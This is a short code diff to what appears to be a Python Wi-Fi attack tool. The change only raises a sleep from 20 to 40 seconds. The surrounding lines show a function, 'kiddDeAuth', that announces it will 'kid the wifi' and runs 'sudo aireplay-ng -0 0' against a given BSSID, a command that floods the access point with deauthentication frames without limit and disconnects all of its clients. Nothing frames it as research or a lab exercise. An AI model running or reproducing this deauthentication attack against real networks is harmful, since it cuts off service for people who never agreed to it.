@@ -24,7 +24,7 @@ def iwCh( channel, interface ):
 
 def kiddDeAuth( BSSID, interface ):
     try:
-        time.sleep( 20 )
+        time.sleep( 40 )
         print( f"\n\n{ red }I am going to kid the wifi right now!\n\n" )
         p = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ] )
         time.sleep( 30 )
